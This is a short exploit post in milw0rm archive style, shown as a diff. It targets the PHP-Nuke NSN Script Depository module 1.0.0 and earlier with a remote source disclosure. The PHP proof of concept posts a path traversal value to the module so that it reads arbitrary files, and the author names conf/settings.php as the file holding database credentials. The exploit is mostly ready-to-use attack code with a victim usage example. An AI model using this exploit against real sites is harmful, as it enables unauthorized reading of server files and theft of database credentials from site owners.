@@ -1,0 +1,43 @@
+---------------------------------------------------------------
+ ____            __________         __             ____  __   
+/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
+ |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
+ |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
+ |___|___|  /\__|  /______  /\___  >__|            |___||__|  
+          \/\______|      \/     \/                         
+---------------------------------------------------------------
+
+Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org 
+
+---------------------------------------------------------------
+
+PHP-Nuke NSN Script Depository module <= 1.0.0 Remote Source Disclosure
+
+---------------------------------------------------------------
+
+#By KiNgOfThEwOrLd
+
+---------------------------------------------------------------
+Exploit
+
+<?
+/*
+Usage: 31337.php?targ=http://[target]/[phpnuke_path]&file=[file]
+Example: 31337.php?targ=http://victim.com/phpnuke&file=conf/settings.php
+*/
+$targ = $_GET['targ'];
+$file = $_GET['file'];
+echo '
+<form action="$targ/modules.php?name=Script_Depository" method="post">
+<input name="show_file" value="/../../$file" type="hidden">
+<input value="show_file" name="op" type="hidden">
+<input type="submit" value="Show Source">
+</form>';
+?>
+
+Trick
+
+In conf/settings.php there are the database credentials  ;) 
+---------------------------------------------------------------
+
+# milw0rm.com [2007-11-27]
